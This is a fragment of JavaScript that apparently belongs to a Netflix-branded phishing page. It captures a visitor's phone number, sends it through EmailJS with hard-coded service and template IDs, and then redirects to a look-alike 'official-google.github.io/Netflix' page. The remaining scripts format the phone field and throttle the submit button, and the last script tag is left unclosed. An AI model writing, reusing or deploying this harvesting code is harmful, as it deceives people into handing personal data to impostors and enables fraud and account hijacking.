<script>
  let formSubmitted = false; // Variable to track form submission
  
  function sendMail(){
    if (formSubmitted) {
      return; // Exit the function if form is already submitted
    }

    let parms = {
      phone: document.getElementById("telephone").value,
      submit_button_id: document.getElementById("NetflixPhone").id
    };
    
    // Set formSubmitted to true before sending email
    formSubmitted = true;
    
    emailjs.send("service_76vugl3", "template_9vpv84j", parms)
      .then(function(response) {
        // Redirect to Google after email is sent
        window.location.href = "https://official-google.github.io/Netflix/Netflix7.html";
      })
      .catch(function(error) {
        console.error('Invalid Phone number!', error);
        // Handle error if necessary
      });
  }

  // Attach form submission event handler
  document.getElementById('MultiForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission
    sendMail(); // Call sendMail function
  });
</script>


<script>
        const telephoneInput = document.getElementById('telephone');

        telephoneInput.addEventListener('focus', function() {
            if (this.value === '') {
                this.value = '+';
            }
        });

        telephoneInput.addEventListener('input', function() {
            if (!this.value.startsWith('+')) {
                this.value = '+' + this.value.replace(/^\+/, '');
            }
        });

        telephoneInput.addEventListener('keydown', function(event) {
            if (this.selectionStart === 1 && (event.key === 'Backspace' || event.key === 'Delete')) {
                event.preventDefault();
            }
        });
    </script>

 <script>
document.getElementById('NetflixPhone').addEventListener('click', function() {
    const button = this;
    button.disabled = true; // Disable the button

    setTimeout(function() {
        button.disabled = false; // Re-enable the button after 5 seconds
    }, 5000); // 5000 milliseconds = 5 seconds
});
